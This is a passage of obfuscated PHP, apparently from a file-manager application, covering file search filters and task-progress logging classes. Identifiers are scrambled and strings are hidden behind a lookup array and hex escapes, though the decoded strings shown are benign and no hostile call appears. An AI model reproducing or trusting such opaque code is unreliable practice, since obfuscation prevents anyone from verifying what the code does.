(!$®ïËìä°[$¾şí«î«[2050]] || $™åşšˆæ[$¾şí«î«[426]][$¾şí«î«[413]] > 1) { return; } $áÍÃ¶Á = Model($¾şí«î«[2218])->listData(); $ÀÄº¸¹ = array(); $ÅÖÖ¢ƒ© = $®ïËìä°[$¾şí«î«[2050]]; foreach ($áÍÃ¶Á as $×ãŸ¨µ) { $ïë§’î = $×ãŸ¨µ[$¾şí«î«[32]]; $¶×øâËÚ = str_replace($¾şí«î«[53], $¾şí«î«[12], Pinyin::get($ïë§’î)); if (stripos($ïë§’î, $ÅÖÖ¢ƒ©) !== !1 || stripos($¶×øâËÚ, $ÅÖÖ¢ƒ©) !== !1) { $ÀÄº¸¹[] = $×ãŸ¨µ[$¾şí«î«[458]]; } } if (!$ÀÄº¸¹) { return; } $³ûİ÷›û = array($¾şí«î«[483] => array($¾şí«î«[7], $ÀÄº¸¹), $¾şí«î«[1757] => USER_ID); $ğ¶Øú« = Model($¾şí«î«[485])->field($¾şí«î«[97])->where($³ûİ÷›û)->select(); $ğ¶Øú« = array_to_keyvalue($ğ¶Øú«, $¾şí«î«[12], $¾şí«î«[97]); $¯Ê®‘ç³ = array_unique($ğ¶Øú«); $this->_listSearchMerge($™åşšˆæ, $®ïËìä°, $‡„•ÅáÕ, $¯Ê®‘ç³); } private function _listSearchDesc(&$ı–ÈÍ¡¨, $ú¼£Ã¯‹, $…‘æÛ˜«) { $Ù¤Øö ° =& $_SERVER[Ñ¯©ç]; if (!$ú¼£Ã¯‹[$Ù¤Øö °[2050]] || $ı–ÈÍ¡¨[$Ù¤Øö °[426]][$Ù¤Øö °[413]] > 1) { return; } $óæØÑ Ò = array($Ù¤Øö °[107] => $Ù¤Øö °[509], $Ù¤Øö °[434] => array($Ù¤Øö °[442], $Ù¤Øö °[2052] . $ú¼£Ã¯‹[$Ù¤Øö °[2050]] . $Ù¤Øö °[2052])); $‰ÓœÈ–© = !1; if ($‰ÓœÈ–©) { $ƒÈğú = $this->listSearchChildren($ú¼£Ã¯‹[$Ù¤Øö °[193]]); $ƒÈğú = array_unique($ƒÈğú); if (!$ƒÈğú) { return; } $óæØÑ Ò[$Ù¤Øö °[194]] = array($Ù¤Øö °[7], $ƒÈğú); } $Ôø”Ûˆş = Model($Ù¤Øö °[615])->field($Ù¤Øö °[194])->where($óæØÑ Ò)->limit(5000)->select(); $¢”ĞÂˆè = array_to_keyvalue($Ôø”Ûˆş, $Ù¤Øö °[12], $Ù¤Øö °[194]); $this->_listSearchMerge($ı–ÈÍ¡¨, $ú¼£Ã¯‹, $…‘æÛ˜«, $¢”ĞÂˆè); } private function _listSearchGroupTag(&$áäüÔ¬ƒ, $¾³­Ö¨‡, $Ä›Éâ“£) { $Ğ¹‚¹°¡ =& $_SERVER[Ñ¯©ç]; if (!$¾³­Ö¨‡[$Ğ¹‚¹°¡[2050]] || $áäüÔ¬ƒ[$Ğ¹‚¹°¡[426]][$Ğ¹‚¹°¡[413]] > 1 || !$¾³­Ö¨‡[$Ğ¹‚¹°¡[193]]) { return; } $ª ÌÓ = $this->sourceInfo($¾³­Ö¨‡[$Ğ¹‚¹°¡[193]]); if (!$ª ÌÓ || $ª ÌÓ[$Ğ¹‚¹°¡[191]] != SourceModel::TYPE_GROUP) { return; } $ıôĞ¿£© = $ª ÌÓ[$Ğ¹‚¹°¡[553]]; $ÅúÂó¶É = Model($Ğ¹‚¹°¡[2219])->get($ıôĞ¿£©); $æï®ùğÉ = array(); $›¦¸ÒË = $¾³­Ö¨‡[$Ğ¹‚¹°¡[2050]]; foreach ($ÅúÂó¶É[$Ğ¹‚¹°¡[429]] as $–•¶û©â) { $¥™«ßß = $–•¶û©â[$Ğ¹‚¹°¡[32]]; $®ÊÏŒ‹ = str_replace($Ğ¹‚¹°¡[53], $Ğ¹‚¹°¡[12], Pinyin::get($¥™«ßß)); if (stripos($¥™«ßß, $›¦¸ÒË) !== !1 || stripos($®ÊÏŒ‹, $›¦¸ÒË) !== !1) { $æï®ùğÉ[] = $–•¶û©â[$Ğ¹‚¹°¡[458]]; } } if (!$æï®ùğÉ) { return; } $îƒğİ´ = array($Ğ¹‚¹°¡[483] => array($Ğ¹‚¹°¡[7], $æï®ùğÉ), $Ğ¹‚¹°¡[1757] => 0, $Ğ¹‚¹°¡[33] => $Ğ¹‚¹°¡[2072] . $ıôĞ¿£©); $ßĞä¡ù® = Model($Ğ¹‚¹°¡[485])->field($Ğ¹‚¹°¡[97])->where($îƒğİ´)->select(); $ßĞä¡ù® = array_to_keyvalue($ßĞä¡ù®, $Ğ¹‚¹°¡[12], $Ğ¹‚¹°¡[97]); $¶»¼µ÷ = array_unique($ßĞä¡ù®); $this->_listSearchMerge($áäüÔ¬ƒ, $¾³­Ö¨‡, $Ä›Éâ“£, $¶»¼µ÷); } private function _listSearchMerge(&$¾Í‰±ŒÅ, $Ó…ìĞËî, $œ¥ƒ¸íŸ, $©…ªş€€) { $¿«¬·¶” =& $_SERVER[Ñ¯©ç]; if (!$©…ªş€€) { return; } $¥ı€ş‰¸ = array_to_keyvalue($¾Í‰±ŒÅ[$¿«¬·¶”[429]], $¿«¬·¶”[12], $¿«¬·¶”[194]); $û•‘§æ = array_diff($©…ªş€€, $¥ı€ş‰¸); if (!$û•‘§æ) { return; } $Ÿ°‚æÛ× = array($¿«¬·¶”[194] => array($¿«¬·¶”[7], $û•‘§æ)); $ªíÍÑøÀ = $this->field($œ¥ƒ¸íŸ)->where($Ÿ°‚æÛ×)->select(); if (!$ªíÍÑøÀ) { return; } $™ƒ˜Ÿ¤ß = array(); foreach ($ªíÍÑøÀ as $ÌŸÜğÔº) { if ($this->_listSearchFilter($ÌŸÜğÔº, $Ó…ìĞËî)) { $™ƒ˜Ÿ¤ß[] = $ÌŸÜğÔº; } } $¾Í‰±ŒÅ[$¿«¬·¶”[429]] = array_merge($™ƒ˜Ÿ¤ß, $¾Í‰±ŒÅ[$¿«¬·¶”[429]]); $¾Í‰±ŒÅ[$¿«¬·¶”[426]][$¿«¬·¶”[427]] += count($™ƒ˜Ÿ¤ß); } private function _listSearchFilter($îŠ†Á¬“, $·òîôí) { $›·ªéÈ¾ =& $_SERVER[Ñ¯©ç]; $‡«ÍÈÉ = $îŠ†Á¬“[$›·ªéÈ¾[468]] == $›·ªéÈ¾[101]; if (!strstr($îŠ†Á¬“[$›·ªéÈ¾[568]], $›·ªéÈ¾[50] . $·òîôí[$›·ªéÈ¾[193]] . $›·ªéÈ¾[50])) { return !1; } if (isset($·òîôí[$›·ªéÈ¾[469]]) && $·òîôí[$›·ªéÈ¾[469]] != $›·ªéÈ¾[2011]) { if ($·òîôí[$›·ªéÈ¾[469]] == $›·ªéÈ¾[88] && !$‡«ÍÈÉ) { return !1; } if ($·òîôí[$›·ªéÈ¾[469]] != $›·ªéÈ¾[88] && $‡«ÍÈÉ) { return !1; } if (!strstr($îŠ†Á¬“[$›·ªéÈ¾[188]], $›·ªéÈ¾[50] . $·òîôí[$›·ªéÈ¾[469]] . $›·ªéÈ¾[50])) { return !1; } } if (isset($·òîôí[$›·ªéÈ¾[2220]]) && $·òîôí[$›·ªéÈ¾[2220]] < $îŠ†Á¬“[$›·ªéÈ¾[89]]) { return !1; } if (isset($·òîôí[$›·ªéÈ¾[2221]]) && $·òîôí[$›·ªéÈ¾[2221]] > $îŠ†Á¬“[$›·ªéÈ¾[89]]) { return !1; } if (isset($·òîôí[$›·ªéÈ¾[645]]) && $·òîôí[$›·ªéÈ¾[645]] != $îŠ†Á¬“[$›·ªéÈ¾[512]]) { return !1; } return !0; } public function listSearchChildren($şÑ®Û, $»œÇÉÉš = 5000) { $Óò´ò¡ =& $_SERVER[Ñ¯©ç]; $Ÿ¦œ­‚« = array(); $» Ô»éÛ = $this->sourceInfo($şÑ®Û); $¯§äÃÚ  = array($Óò´ò¡[568] => array($Óò´ò¡[442], $» Ô»éÛ[$Óò´ò¡[568]] . $» Ô»éÛ[$Óò´ò¡[194]] . $Óò´ò¡[596])); $†Ğò•Âª = $this->field($Óò´ò¡[89])->where($¯§äÃÚ )->limit($»œÇÉÉš + 1)->select(); $ªøê—è§ = is_array($†Ğò•Âª) ? count($†Ğò•Âª) : 0; if ($ªøê—è§ > $»œÇÉÉš) { return $this->_listSearchChildrenNear($şÑ®Û, $»œÇÉÉš); } $Íæë°Ö = $this->field($Óò´ò¡[194])->where($¯§äÃÚ )->select(); $Ÿ¦œ­‚« = array_to_keyvalue($Íæë°Ö, $Óò´ò¡[12], $Óò´ò¡[194]); return $Ÿ¦œ­‚«; } private function _listSearchChildrenNear($üò¿°’Š, $ÔÑ—ûÑ¨) { $«ÇøÌÜ =& $_SERVER[Ñ¯©ç]; $úåšÜŸ« = array(); $æİ÷°Ññ = array($«ÇøÌÜ[193] => $üò¿°’Š); $í’ıé§ = $this->field($«ÇøÌÜ[2222])->where($æİ÷°Ññ)->select(); $îøÎê´ë = array_to_keyvalue(array_filter_by_field($í’ıé§, $«ÇøÌÜ[468], $«ÇøÌÜ[101]), $«ÇøÌÜ[12], $«ÇøÌÜ[194]); $úåšÜŸ« = array_merge($úåšÜŸ«, array_to_keyvalue($í’ıé§, $«ÇøÌÜ[12], $«ÇøÌÜ[194])); if (!$îøÎê´ë) { return $úåšÜŸ«; } $æİ÷°Ññ = array($«ÇøÌÜ[193] => array($«ÇøÌÜ[7], $îøÎê´ë)); $í’ıé§ = $this->field($«ÇøÌÜ[2222])->where($æİ÷°Ññ)->limit($ÔÑ—ûÑ¨)->select(); $úåšÜŸ« = array_merge($úåšÜŸ«, array_to_keyvalue($í’ıé§, $«ÇøÌÜ[12], $«ÇøÌÜ[194])); $úåšÜŸ« = array_slice($úåšÜŸ«, 0, intval($ÔÑ—ûÑ¨)); return $úåšÜŸ«; } private function _listSearchBindPinyin($–şÈ²İğ, &$«£Œ³Ûµ, &$Ø„´—Ò) { $×øò¤·Ä =& $_SERVER[Ñ¯©ç]; if (!isset($–şÈ²İğ[$×øò¤·Ä[2050]]) || !$–şÈ²İğ[$×øò¤·Ä[2050]]) { return; } if (!Input::check($–şÈ²İğ[$×øò¤·Ä[2050]], $×øò¤·Ä[378]) || strlen($–şÈ²İğ[$×øò¤·Ä[2050]]) < 2) { return; } $¿™üŞ­ª = "\114\105\106\124\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\151\157\137\x73\x6f\165\162\x63\145\x5f\155\145\164\141\40\155\145\x74\x61\40\x6f\x6e\x20\163\x6f\x75\x72\x63\x65\x2e\x73\x6f\165\162\x63\145\111\x44\x20\75\x20\155\x65\164\141\x2e\x73\157\x75\x72\x63\145\x49\104"; $ñ½¤÷‘’ = array(); $Ø„´—Ò = str_replace(array($×øò¤·Ä[59], $×øò¤·Ä[53], $×øò¤·Ä[2223]), $×øò¤·Ä[12], $Ø„´—Ò); $Ø„´—Ò = $×øò¤·Ä[494] . str_replace($×øò¤·Ä[50], $×øò¤·Ä[495], $Ø„´—Ò); $ÀÒ¾õĞÇ = $«£Œ³Ûµ[$×øò¤·Ä[32]]; unset($«£Œ³Ûµ[$×øò¤·Ä[32]]); foreach ($«£Œ³Ûµ as $–©à¾’ => $×¶–ÈËµ) { $ñ½¤÷‘’[$×øò¤·Ä[494] . $–©à¾’] = $×¶–ÈËµ; } foreach ($ÀÒ¾õĞÇ as $„€¾Åš§) { $ñ½¤÷‘’[] = array($×øò¤·Ä[499] => $„€¾Åš§, $×øò¤·Ä[1053] => $×øò¤·Ä[2054], array($×øò¤·Ä[2224] => $„€¾Åš§, $×øò¤·Ä[2225] => array($×øò¤·Ä[7], array($×øò¤·Ä[521], $×øò¤·Ä[520])))); } $this->join($¿™üŞ­ª); $«£Œ³Ûµ = $ñ½¤÷‘’; } private function _parseSearchWhere($Éåóœ‹£) { $‹Š‰Êƒ =& $_SERVER[Ñ¯©ç]; $ÑÂñª¬Ï = array(); if (isset($Éåóœ‹£[$‹Š‰Êƒ[813]]) && $Éåóœ‹£[$‹Š‰Êƒ[813]]) { $ÑÂñª¬Ï[$‹Š‰Êƒ[98]] = array($‹Š‰Êƒ[2226], $Éåóœ‹£[$‹Š‰Êƒ[813]]); } if (isset($Éåóœ‹£[$‹Š‰Êƒ[814]]) && $Éåóœ‹£[$‹Š‰Êƒ[814]]) { $ÓÊ³ƒñù = array($‹Š‰Êƒ[2227], $Éåóœ‹£[$‹Š‰Êƒ[814]]); if ($ÑÂñª¬Ï[$‹Š‰Êƒ[98]]) { $ÑÂñª¬Ï[$‹Š‰Êƒ[98]] = array($ÑÂñª¬Ï[$‹Š‰Êƒ[98]], $ÓÊ³ƒñù, $‹Š‰Êƒ[2228]); } else { $ÑÂñª¬Ï[$‹Š‰Êƒ[98]] = $ÓÊ³ƒñù; } } if (isset($Éåóœ‹£[$‹Š‰Êƒ[2220]]) && $Éåóœ‹£[$‹Š‰Êƒ[2220]] > 0) { $ÑÂñª¬Ï[$‹Š‰Êƒ[89]] = array($‹Š‰Êƒ[2226], $Éåóœ‹£[$‹Š‰Êƒ[2220]]); } if (isset($Éåóœ‹£[$‹Š‰Êƒ[2221]]) && $Éåóœ‹£[$‹Š‰Êƒ[2221]]) { $ÓÊ³ƒñù = array($‹Š‰Êƒ[2227], $Éåóœ‹£[$‹Š‰Êƒ[2221]]); if ($ÑÂñª¬Ï[$‹Š‰Êƒ[89]]) { $ÑÂñª¬Ï[$‹Š‰Êƒ[89]] = array($ÑÂñª¬Ï[$‹Š‰Êƒ[89]], $ÓÊ³ƒñù, $‹Š‰Êƒ[2228]); } else { $ÑÂñª¬Ï[$‹Š‰Êƒ[89]] = $ÓÊ³ƒñù; } } if (isset($Éåóœ‹£[$‹Š‰Êƒ[645]]) && $Éåóœ‹£[$‹Š‰Êƒ[645]]) { $ÑÂñª¬Ï[] = array($‹Š‰Êƒ[512] => $Éåóœ‹£[$‹Š‰Êƒ[645]], $‹Š‰Êƒ[510] => $Éåóœ‹£[$‹Š‰Êƒ[645]], $‹Š‰Êƒ[1053] => $‹Š‰Êƒ[2054]); } if (isset($Éåóœ‹£[$‹Š‰Êƒ[469]]) && $Éåóœ‹£[$‹Š‰Êƒ[469]]) { $«ÒÛş‹¡ = $Éåóœ‹£[$‹Š‰Êƒ[469]]; if ($«ÒÛş‹¡ == $‹Š‰Êƒ[88]) { $ÑÂñª¬Ï[$‹Š‰Êƒ[468]] = 1; } else { if ($«ÒÛş‹¡ == $‹Š‰Êƒ[2229]) { $ÑÂñª¬Ï[$‹Š‰Êƒ[468]] = 0; } else { if ($«ÒÛş‹¡) { $«ÒÛş‹¡ = is_array($«ÒÛş‹¡) ? $«ÒÛş‹¡ : explode($‹Š‰Êƒ[50], $«ÒÛş‹¡); $ÑÂñª¬Ï[$‹Š‰Êƒ[469]] = array($‹Š‰Êƒ[475], $«ÒÛş‹¡); $ÑÂñª¬Ï[$‹Š‰Êƒ[468]] = 0; } } } } $this->_parseSearchParent($Éåóœ‹£, $ÑÂñª¬Ï); if (isset($Éåóœ‹£[$‹Š‰Êƒ[2050]]) && trim($Éåóœ‹£[$‹Š‰Êƒ[2050]])) { $ıÍæåÚ’ = trim($Éåóœ‹£[$‹Š‰Êƒ[2050]]); $ĞÉ—”Ë = explode($‹Š‰Êƒ[53], $ıÍæåÚ’); if (strlen($ıÍæåÚ’) > 2 && (substr($ıÍæåÚ’, 0, 1) == $‹Š‰Êƒ[131] && substr($ıÍæåÚ’, -1) == $‹Š‰Êƒ[131]) || substr($ıÍæåÚ’, 0, 1) == $‹Š‰Êƒ[68] && substr($ıÍæåÚ’, -1) == $‹Š‰Êƒ[68]) { $ıÍæåÚ’ = substr($ıÍæåÚ’, 1, -1); $ĞÉ—”Ë = array($ıÍæåÚ’); } $ÑÂñª¬Ï[$‹Š‰Êƒ[32]] = array(array($‹Š‰Êƒ[595], $‹Š‰Êƒ[2052] . $ıÍæåÚ’ . $‹Š‰Êƒ[2052])); if (count($ĞÉ—”Ë) > 1) { $ÑÂñª¬Ï[$‹Š‰Êƒ[32]] = array(); foreach ($ĞÉ—”Ë as $§İ‰Ñí») { if (!trim($§İ‰Ñí»)) { continue; } $ÑÂñª¬Ï[$‹Š‰Êƒ[32]][] = array($‹Š‰Êƒ[595], $‹Š‰Êƒ[2052] . trim($§İ‰Ñí») . $‹Š‰Êƒ[2052]); } } } return $ÑÂñª¬Ï; } private function _parseSearchParent($…©·ñ¡‡, &$•çµ½®¨) { $÷€üæûí =& $_SERVER[Ñ¯©ç]; if (!isset($…©·ñ¡‡[$÷€üæûí[193]]) || !$…©·ñ¡‡[$÷€üæûí[193]]) { return; } $ãàğ¿êã = $this->pathInfo($…©·ñ¡‡[$÷€üæûí[193]]); $´©ò¾†§ = $ãàğ¿êã[$÷€üæûí[193]] . $÷€üæûí[12] === $÷€üæûí[229]; $ ÍÜÕÚë = $ãàğ¿êã[$÷€üæûí[191]] == $÷€üæûí[562]; if ($ãàğ¿êã[$÷€üæûí[579]] == $÷€üæûí[580]) { $ò²ä‹® = $this->sourceInfo($…©·ñ¡‡[$÷€üæûí[193]]); $ãàğ¿êã[$÷€üæûí[568]] = $ò²ä‹®[$÷€üæûí[568]]; } $•çµ½®¨[$÷€üæûí[635]] = array($÷€üæûí[595], $ãàğ¿êã[$÷€üæûí[568]] . $…©·ñ¡‡[$÷€üæûí[193]] . $÷€üæûí[596]); $ ·¾àÂÌ = isset($…©·ñ¡‡[$÷€üæûí[1914]]) && in_array($÷€üæûí[562], $…©·ñ¡‡[$÷€üæûí[1914]]); if (!$ ·¾àÂÌ || !$ ÍÜÕÚë || !$´©ò¾†§ || !$ãàğ¿êã[$÷€üæûí[470]]) { return; } if (!AuthModel::authCheckRoot($ãàğ¿êã[$÷€üæûí[470]][$÷€üæûí[471]])) { return; } $¢Ôäı™Ó = $ãàğ¿êã[$÷€üæûí[553]] . $÷€üæûí[12]; if ($¢Ôäı™Ó == $÷€üæûí[101]) { unset($•çµ½®¨[$÷€üæûí[635]]); $•çµ½®¨[$÷€üæûí[191]] = self::TYPE_GROUP; return; } $›ò÷Õ½ = Model($÷€üæûí[569])->groupChildrenAll($¢Ôäı™Ó); $„²ü‚è = count($›ò÷Õ½); if ($„²ü‚è <= 1) { return; } $µÀß×Ò¾ = array($÷€üæûí[193] => 0, $÷€üæûí[191] => self::TYPE_GROUP, $÷€üæûí[553] => array($÷€üæûí[7], $›ò÷Õ½)); $ÔÈƒ‚‡Ò = $this->field($÷€üæûí[2230])->where($µÀß×Ò¾)->limit($„²ü‚è)->select(); $•çµ½®¨[$÷€üæûí[635]] = array(); foreach ($ÔÈƒ‚‡Ò as $ÌËÄå´²) { $•çµ½®¨[$÷€üæûí[635]][] = array($÷€üæûí[595], $÷€üæûí[578] . $ÌËÄå´²[$÷€üæûí[194]] . $÷€üæûí[596]); } $•çµ½®¨[$÷€üæûí[635]][] = $÷€üæûí[2054]; } } goto eö¶ŞÑœì¸; dø‡ë«›½ä: class TaskHttp extends Task { protected function startAfter() { $Ó£ÅÜÉì =& $_SERVER[Ñ¯©ç]; $úÄÏå®© =& $this->task; $úÄÏå®©[$Ó£ÅÜÉì[1834]] = 1; Hook::bind($Ó£ÅÜÉì[1802], array($this, $Ó£ÅÜÉì[1835])); Hook::bind($Ó£ÅÜÉì[1804], array($this, $Ó£ÅÜÉì[1836])); Hook::bind($Ó£ÅÜÉì[1806], array($this, $Ó£ÅÜÉì[1837])); } protected function endAfter() { $ù‹å€““ =& $_SERVER[Ñ¯©ç]; Hook::unbind($ù‹å€““[1802], array($this, $ù‹å€““[1835])); Hook::unbind($ù‹å€““[1804], array($this, $ù‹å€““[1836])); Hook::unbind($ù‹å€““[1806], array($this, $ù‹å€““[1837])); } public function progressStart($Ø¤ ¼ùÃ) { $ğ½“˜Ë =& $_SERVER[Ñ¯©ç]; $ŞÌšñÛ¿ = curl_getinfo($Ø¤ ¼ùÃ); self::log($ğ½“˜Ë[1838] . $ŞÌšñÛ¿[$ğ½“˜Ë[367]]); self::valueSet($this->task[$ğ½“˜Ë[458]], $this->task); } public function progressEnd($àîª§ÑÜ) { $ıà’Úô =& $_SERVER[Ñ¯©ç]; self::log($ıà’Úô[1839] . $this->task[$ıà’Úô[458]]); $this->end(); } public function progress($Ø¬¼ïöİ, $–×ª üÏ, $õ¦Æ„, $Á™ÖÓÄ, $¥ıšË¬¬) { $úÑĞ½¬ã =& $_SERVER[Ñ¯©ç]; $¤ËÎæª =& $this->task; if ($¥ıšË¬¬ > 0) { $¤ËÎæª[$úÑĞ½¬ã[1116]] = $¤ËÎæª[$úÑĞ½¬ã[1116]] == 0 ? $Á™ÖÓÄ : $¤ËÎæª[$úÑĞ½¬ã[1116]]; $¤ËÎæª[$úÑĞ½¬ã[1758]] = $¥ıšË¬¬; } else { if ($õ¦Æ„ > 0) { $¤ËÎæª[$úÑĞ½¬ã[1116]] = $¤ËÎæª[$úÑĞ½¬ã[1116]] == 0 ? $–×ª üÏ : $¤ËÎæª[$úÑĞ½¬ã[1116]]; $¤ËÎæª[$úÑĞ½¬ã[1758]] = $õ¦Æ„; } } $this->update(); self::log("\x70\x72\157\147\162\145\163\163\110\x74\164\160\x3a\x64\x6f\x77\x6e\72{$õ¦Æ„}\x2f{$–×ª üÏ}\x3b\x20\x75\160\x6c\x6f\x61\144\x3a{$¥ıšË¬¬}\x2f{$Á™ÖÓÄ}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Õò°ĞŠ…, $‚÷í‘÷Ù = '', $Û™ö¦Ÿİ = 0, $àÀ¥óş = '') { $úØñ¿®û =& $_SERVER[Ñ¯©ç]; $àÀ¥óş = $àÀ¥óş ? $àÀ¥óş : ($‚÷í‘÷Ù ? $‚÷í‘÷Ù : $Õò°ĞŠ…); $Â‡øÕŸ† = new Task($Õò°ĞŠ…, $‚÷í‘÷Ù, $Û™ö¦Ÿİ, $àÀ¥óş); $GLOBALS[$úØñ¿®û[1840] . $Õò°ĞŠ…] = new TaskLog($úØñ¿®û[1741], $Â‡øÕŸ†, $àÀ¥óş); return $Â‡øÕŸ†; } public function __construct($ü¿´ç“ = '', $Ë“‡•Œ° = '', $‘¿Ô™‹í = '') { $˜Û‘ë¸í =& $_SERVER[Ñ¯©ç]; if (!$ü¿´ç“) { $ü¿´ç“ = $˜Û‘ë¸í[1741]; } $ŞÙĞõ˜¥ = $ü¿´ç“ . $˜Û‘ë¸í[445] . rand_string(10); if (!$‘¿Ô™‹í) { $‘¿Ô™‹í = $ü¿´ç“ . $˜Û‘ë¸í[53] . $‘¿Ô™‹í; } switch ($ü¿´ç“) { case $˜Û‘ë¸í[1741]: if (!$Ë“‡•Œ° || !$Ë“‡•Œ°->task) { return echoLog($ü¿´ç“ . $˜Û‘ë¸í[1841]); } $ëÑ‚ùÈ = $Ë“‡•Œ°; $ŞÙĞõ˜¥ = $ëÑ‚ùÈ->task[$˜Û‘ë¸í[458]]; $ü¿´ç“ = $ëÑ‚ùÈ->task[$˜Û‘ë¸í[458]]; if (!$ëÑ‚ùÈ->task[$˜Û‘ë¸í[1647]]) { $ëÑ‚ùÈ->task[$˜Û‘ë¸í[1647]] = $‘¿Ô™‹í ? $‘¿Ô™‹í : $ü¿´ç“; } break; case $˜Û‘ë¸í[1842]: if (!$Ë“‡•Œ°) { return echoLog($ü¿´ç“ . $˜Û‘ë¸í[1843]); } $­†©›°ô = is_string($Ë“‡•Œ°) ? array($Ë“‡•Œ°) : $Ë“‡•Œ°; $ëÑ‚ùÈ = new TaskFileTransfer($ŞÙĞõ˜¥, $ü¿´ç“, 0, $‘¿Ô™‹í ? $‘¿Ô™‹í : $­†©›°ô[0]); foreach ($­†©›°ô as $±ë’ºÓç) { $ëÑ‚ùÈ->addPath($±ë’ºÓç); } break; case $˜Û‘ë¸í[373]: if (!$Ë“‡•Œ°) { return echoLog($ü¿´ç“ . $˜Û‘ë¸í[1843]); } $­†©›°ô = is_string($Ë“‡•Œ°) ? array($Ë“‡•Œ°) : $Ë“‡•Œ°; $ëÑ‚ùÈ = new TaskZip($ŞÙĞõ˜¥, $ü¿´ç“, 0, $‘¿Ô™‹í ? $‘¿Ô™‹í : $­†©›°ô[0]); foreach ($­†©›°ô as $±ë’ºÓç) { $ëÑ‚ùÈ->addPath($±ë’ºÓç); } break; case $˜Û‘ë¸í[1271]: if (!$Ë“‡•Œ°) { return echoLog($ü¿´ç“ . $˜Û‘ë¸í[1843]); } $ëÑ‚ùÈ = new TaskUnZip($ŞÙĞõ˜¥, $ü¿´ç“, 0, $‘¿Ô™‹í ? $‘¿Ô™‹í : $Ë“‡•Œ°); if ($Ë“‡•Œ°) { $ëÑ‚ùÈ->addFile($Ë“‡•Œ°); } break; case $˜Û‘ë¸í[162]: $ëÑ‚ùÈ = new TaskHttp($ŞÙĞõ˜¥, $ü¿´ç“); break; default: return; break; } $this->task = $ëÑ‚ùÈ; $this->taskID = $ŞÙĞõ˜¥; Hook::bind($˜Û‘ë¸í[1778], array($this, $˜Û‘ë¸í[1844])); Hook::bind($˜Û‘ë¸í[1780], array($this, $˜Û‘ë¸í[1845])); Hook::bind($˜Û‘ë¸í[1774], array($this, $˜Û‘ë¸í[1846])); echoLog($˜Û‘ë¸í[1847] . $ëÑ‚ùÈ->task[$˜Û‘ë¸í[1647]]); } public function __destruct() { $this->end(); } public function end($Ãª—İĞù = '') { $ºèèˆ×Â =& $_SERVER[Ñ¯©ç]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Ãª—İĞù); $this->task = !1; $this->taskID = !1; Hook::unbind($ºèèˆ×Â[1778], array($this, $ºèèˆ×Â[1844])); Hook::unbind($ºèèˆ×Â[1780], array($this, $ºèèˆ×Â[1845])); Hook::unbind($ºèèˆ×Â[1774], array($this, $ºèèˆ×Â[1846])); } public function taskUpdate($âÉÇ½ãõ) { $Œ˜óéë =& $_SERVER[Ñ¯©ç]; if (!$âÉÇ½ãõ || $this->taskID != $âÉÇ½ãõ[$Œ˜óéë[458]]) { return; } $º‡µˆ“× = 20; $èò¹±² = intval($âÉÇ½ãõ[$Œ˜óéë[1759]] * $º‡µˆ“×); $¬Ñ—®® = $Œ˜óéë[176] . str_repeat($Œ˜óéë[937], $èò¹±²) . $Œ˜óéë[1067] . str_repeat($Œ˜óéë[53], $º‡µˆ“× - $èò¹±²) . $Œ˜óéë[178]; $ÈÔñÃşÒ = $¬Ñ—®® . sprintf($Œ˜óéë[1848], $âÉÇ½ãõ[$Œ˜óéë[1759]] * 100) . $Œ˜óéë[1849]; $¤ààº¼Ÿ = $ÈÔñÃşÒ . $âÉÇ½ãõ[$Œ˜óéë[1758]] . $Œ˜óéë[8] . $âÉÇ½ãõ[$Œ˜óéë[1116]] . LNG($Œ˜óéë[1850]); $³ŞÆÔ = $Œ˜óéë[12]; if ($âÉÇ½ãõ[$Œ˜óéë[1834]]) { $¤ààº¼Ÿ = $ÈÔñÃşÒ . size_format($âÉÇ½ãõ[$Œ˜óéë[1758]]) . $Œ˜óéë[8] . size_format($âÉÇ½ãõ[$Œ˜óéë[1116]]); $³ŞÆÔ = size_format($âÉÇ½ãõ[$Œ˜óéë[1760]]) . $Œ˜óéë[1851]; } if ($âÉÇ½ãõ[$Œ˜óéë[1118]]) { $âÉÇ½ãõ[$Œ˜óéë[1808]] = $âÉÇ½ãõ[$Œ˜óéë[1118]] . $Œ˜óéë[53] . $âÉÇ½ãõ[$Œ˜óéë[1808]]; } if ($âÉÇ½ãõ[$Œ˜óéë[1808]]) { $¡¡ûÈÕû = $Œ˜óéë[12]; if ($âÉÇ½ãõ[$Œ˜óéë[1810]]) { $¡¡ûÈÕû = $Œ˜óéë[50] . size_format($âÉÇ½ãõ[$Œ˜óéë[1811]]) . $Œ˜óéë[8] . size_format($âÉÇ½ãõ[$Œ˜óéë[1810]]); } $³ŞÆÔ .= $âÉÇ½ãõ[$Œ˜óéë[1808]] . $¡¡ûÈÕû; } if ($âÉÇ½ãõ[$Œ˜óéë[816]] && !$âÉÇ½ãõ[$Œ˜óéë[1810]]) { $³ŞÆÔ .= $Œ˜óéë[53] . size_format($âÉÇ½ãõ[$Œ˜óéë[1815]]) . $Œ˜óéë[8] . size_format($âÉÇ½ãõ[$Œ˜óéë[816]]); } echoLog($¤ààº¼Ÿ . $Œ˜óéë[53] . $³ŞÆÔ, !0); } public function taskEnd($ÀŸ¤˜ù) { $°‹Î»¡ =& $_SERVER[Ñ¯©ç]; if (!$ÀŸ¤˜ù || $this->taskID != $ÀŸ¤˜ù[$°‹Î»¡[458]]) { return; } $ú£Ñêí¹ = $ÀŸ¤˜ù ? $ÀŸ¤˜ù[$°‹Î»¡[1758]] . $°‹Î»¡[8] . $ÀŸ¤˜ù[$°‹Î»¡[1116]] . LNG($°‹Î»¡[1850]) . $°‹Î»¡[84] : $°‹Î»¡[12]; echoLog($°‹Î»¡[1852] . $ÀŸ¤˜ù[$°‹Î»¡[1647]] . ($ÀŸ¤˜ù[$°‹Î»¡[509]] ? $°‹Î»¡[84] . $ÀŸ¤˜ù[$°‹Î»¡[509]] : $°‹Î»¡[12]) . $°‹Î»¡[84] . $ú£Ñêí¹ . $°‹Î»¡[1853] . sprintf($°‹Î»¡[903], timeFloat() - $ÀŸ¤˜ù[$°‹Î»¡[1761]]) . $°‹Î»¡[1773]); $this->end(); } public function taskKill($À§„­¤Ÿ) { $¤Œ‡ÓØ± =& $_SERVER[Ñ¯©ç]; if (!$À§„­¤Ÿ || $this->taskID != $À§„­¤Ÿ[$¤Œ‡ÓØ±[458]]) { return; } echoLog($¤Œ‡ÓØ±[1854] . $À§„­¤Ÿ[$¤Œ‡ÓØ±[1647]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = 